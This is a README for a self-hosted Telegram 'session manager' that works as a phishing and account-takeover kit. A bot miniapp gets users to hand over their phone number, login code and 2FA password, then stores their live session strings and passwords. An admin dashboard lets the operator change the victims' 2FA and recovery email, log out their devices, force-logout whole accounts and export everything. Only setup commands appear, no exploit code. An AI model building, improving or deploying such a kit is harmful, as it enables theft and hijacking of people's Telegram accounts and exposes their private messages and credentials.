# Manager

Self-hosted Telegram session manager — captures sessions via a built-in miniapp + bot, then lets you manage devices, 2FA, mail, protection, and 24h auto-logout from a single responsive web UI.

## What's bundled

Single Flask app, single port, single `start.sh`. Three things run together:

1. **Telegram bot** (Telethon) — `/start` replies "👇"; receives contacts and stores `user_id → phone`
2. **Miniapp** (`/m/`) — Telegram WebApp that asks for contact, sends OTP, verifies 2FA, captures `StringSession`, stores it in DB, logs to your channel
3. **Manager UI** (`/`) — password-gated admin dashboard to manage every captured session

## Stack

- Python 3 + Flask + Telethon (no `python-telegram-bot` dependency)
- SQLite (single file `manager.db`)
- Vanilla JS frontend (dark, mobile-first, no build step)
- Optional Cloudflare tunnel for public HTTPS

## Features

- **Dashboard** — total sessions, today's new, protected, 2FA count, pending auto-logout, bot online status, miniapp URL banner (copy-to-clipboard)
- **Sessions tab** — every captured session with phone / name / username / 2FA / email / protected / current badges, full search + filters, per-row actions
- **Devices** — live `GetAuthorizationsRequest` per account; per-device logout via `ResetAuthorizationRequest`; "logout all others" button
- **2FA** — read current 2FA status (hint, recovery email); set new cloud password + hint + recovery email
- **Email** — attach an email label to each session
- **Protect** — protected sessions are never auto-logged-out
- **Set Current** — marks the device you're managing from
- **Force Logout** — kills ALL authorizations on a Telegram account in one click
- **Detail modal** — full session data incl. captured 2FA password, notes editor, copy-session-string
- **Auto-logout toggle** — when ON, every new session gets a 24h timer (configurable). When timer fires: all authorizations on that account are killed via Telethon. Fires once per session. Protected / current sessions are skipped.
- **Activity log** — every action recorded with timestamp
- **Export JSON** — one-click download of all session data
- **Password gate** — default `manager123` (login error message reminds you when password is still default)
- **Stable sessions** — Flask secret key persisted to `.secret_key` file, so admin login survives restarts
- **Channel logging** — if `LOG_CHANNEL_ID` is set, every successful login is logged to your Telegram channel (same format as your reference bot)

## Quick start

```bash
git clone https://github.com/ImAshhhhh/manager.git
cd manager
cp .env.example .env
nano .env       # set API_ID, API_HASH, BOT_TOKEN, LOG_CHANNEL_ID
./start.sh
```

This launches:
- Manager UI:  `http://localhost:5000/`
- Miniapp:     `http://localhost:5000/m/`
- Bot polling in background

Open `http://localhost:5000/` → password `manager123`.

For public HTTPS (so Telegram can reach the miniapp):

```bash
USE_TUNNEL=1 ./start.sh
```

This starts a Cloudflare tunnel, prints the public URL, and writes it to `.env` as `MINI_APP_URL`. The Manager dashboard will show the miniapp URL with a copy button.

## BotFather setup

After `USE_TUNNEL=1 ./start.sh` prints the tunnel URL:

1. Open `@BotFather` in Telegram
2. Send `/mybots` → select your bot → **Bot Settings** → **Menu Button**
3. Set the Web App URL to `<tunnel-url>/m/`

Now anyone who opens your bot's menu button will hit the miniapp, verify their account, and their session lands in Manager.

## Flow

```
User opens bot → /start → "👇"
User taps menu button → miniapp opens at /m/
Miniapp requests contact → user grants
Bot receives contact → stores user_id → phone
Miniapp polls /api/bot/contact-status/<uid> → gets phone
Miniapp POSTs /api/bot/request-code → Telethon sends OTP
User enters OTP → /api/bot/verify-code
  → Telethon signs in (asks 2FA password if needed)
  → StringSession saved
  → db.insert_session({phone, user_id, username, name, session_string, twofa_password})
  → log_to_channel(...) if LOG_CHANNEL_ID set
  → audit logged
Miniapp shows ✅
Manager dashboard shows the new session (auto-refresh every 30s)
```

## Auto-logout semantics

- Toggle ON in Settings → every session currently without a timer gets one (`now + 24h`), and every new session inserted afterwards gets one on insert.
- Background worker checks every 60s. Any session with `auto_logout_fired = 0` and `auto_logout_at <= now` triggers:
  - If `is_protected = 1` → skipped (marked fired, audit-logged as `auto_logout_skipped`)
  - Else → Telethon `ResetAuthorizationRequest` for every authorization on that account → audit-logged as `auto_logout_fired`
- Toggle OFF → no new timers added; existing pending timers still fire once.
- "Fires once per session" is enforced by `auto_logout_fired` flag.

## Endpoints

### Manager (admin-gated)

| Method | Path | Purpose |
|---|---|---|
| POST | `/api/login` | `{password}` → cookie |
| POST | `/api/logout` | Clears session |
| GET | `/api/me` | `{admin: bool}` |
| GET | `/api/dashboard` | Stats |
| GET | `/api/sessions` | List |
| GET | `/api/sessions/<id>` | Full detail (incl. session_string + 2FA password) |
| DELETE | `/api/sessions/<id>` | Remove from DB |
| POST | `/api/sessions/<id>/protect` | `{value: bool}` |
| POST | `/api/sessions/<id>/current` | `{value: bool}` |
| POST | `/api/sessions/<id>/mail` | `{email}` |
| POST | `/api/sessions/<id>/notes` | `{notes}` |
| GET | `/api/sessions/<id>/devices` | List authorizations |
| POST | `/api/sessions/<id>/logout-device` | `{hash}` |
| POST | `/api/sessions/<id>/logout-others` | Kill all except current |
| POST | `/api/sessions/<id>/force-logout` | Kill ALL authorizations |
| GET | `/api/sessions/<id>/2fa-status` | Has 2FA / hint / recovery |
| POST | `/api/sessions/<id>/2fa` | Set new password + hint + email |
| GET/POST | `/api/settings` | Read / update settings |
| GET | `/api/audit?limit=100` | Activity log |
| GET | `/api/export` | JSON dump of all sessions |

### Miniapp (no auth)

| Method | Path | Purpose |
|---|---|---|
| GET | `/api/bot/health` | Status check |
| POST | `/api/bot/store-contact` | `{user_id, phone}` |
| GET | `/api/bot/contact-status/<uid>` | `{status, phone}` |
| POST | `/api/bot/request-code` | `{phone}` → `{session_id}` |
| POST | `/api/bot/verify-code` | `{session_id, code, password?}` → `{success, session_string, user}` |

### External ingest (optional)

| Method | Path | Purpose |
|---|---|---|
| POST | `/api/ingest` | Capture session from another bot. Body: `{phone, user_id, username, name, session_string, twofa_password}`. Optional `X-Ingest-Token` header if `INGEST_TOKEN` is set. |

## Files

```
manager/
├── app.py              # Flask app — Manager + miniapp + bot API routes
├── db.py               # SQLite layer + audit
├── telegram_ops.py     # Telethon: devices, 2FA, force-logout
├── telegram_login.py   # Telethon: send-code + verify (login capture)
├── telegram_bot.py     # Telethon: bot polling + contact capture + channel log
├── auto_logout.py      # Background 24h worker
├── start.sh            # Bootstrap script
├── requirements.txt
├── .env.example
├── .gitignore
├── README.md
└── static/
    ├── login.html      # Manager login
    ├── index.html      # Manager dashboard
    ├── style.css
    ├── app.js
    └── miniapp/
        ├── index.html  # Telegram WebApp
        ├── style.css
        └── script.js
```

## Stop

```bash
pkill -f 'python.*app.py'
pkill cloudflared  # if tunnel was started
```

## Troubleshooting

- **Login page says "wrong password"** — default password is `manager123`. If you changed it in Settings and forgot, delete `manager.db` to reset everything.
- **Cookie lost after restart** — fixed; `.secret_key` file persists the Flask secret across restarts. Don't delete that file or all sessions get logged out.
- **Bot not responding to /start** — check `BOT_TOKEN`, `API_ID`, `API_HASH` in `.env` (or Settings UI). Re-run `./start.sh` after editing `.env`.
- **Miniapp says "Open in Telegram"** — open it via the bot's menu button (set in BotFather), not in a browser.
- **`/api/bot/request-code` returns "Manager not configured"** — `API_ID` / `API_HASH` not set. Add to `.env` and restart, or set in Settings UI.
- **Device / 2FA calls fail with "Session not authorized"** — the captured `session_string` for that account was invalidated (e.g. user logged out from Telegram settings). Re-capture by having them re-run the miniapp flow.

## Notes

- `manager.db`, `.secret_key`, `bot_session*` are git-ignored. Back them up.
- Sessions captured via the miniapp contain the raw `StringSession` and the 2FA password. The DB file is the crown jewels — protect the host.
- All Telethon calls (bot polling, login flow, device/2FA management) run on separate asyncio loops in background threads, so Flask request threads never block.
- `.env` values for `API_ID` / `API_HASH` / `BOT_TOKEN` / `LOG_CHANNEL_ID` sync into the DB on first start. After that, Settings UI changes win — editing `.env` won't override them.
